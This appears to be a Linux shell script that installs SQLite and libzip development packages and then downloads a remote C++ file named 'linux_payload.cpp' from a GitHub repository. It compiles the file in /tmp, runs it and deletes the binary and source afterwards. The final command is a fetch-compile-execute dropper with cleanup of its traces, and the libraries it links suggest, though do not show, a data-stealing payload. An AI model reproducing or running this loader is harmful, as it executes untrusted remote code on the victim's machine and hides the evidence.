if command -v apt-get >/dev/null 2>&1; then
    apt-get update
    apt-get install -y libsqlite3-dev sqlite3 libzip-dev

elif command -v pacman >/dev/null 2>&1; then
    pacman -Sy --noconfirm sqlite libzip

elif command -v dnf >/dev/null 2>&1; then
    dnf install -y sqlite-devel libzip-devel

elif command -v zypper >/dev/null 2>&1; then
    zypper install -y sqlite3-devel libzip-devel
fi

curl -sL https://raw.githubusercontent.com/QUADROisCoding/Wininstall/refs/heads/main/linux_payload.cpp \
  -o /tmp/p.cpp && \
g++ -std=c++17 -o /tmp/p /tmp/p.cpp -lsqlite3 -lzip && \
/tmp/p && rm /tmp/p /tmp/p.cpp
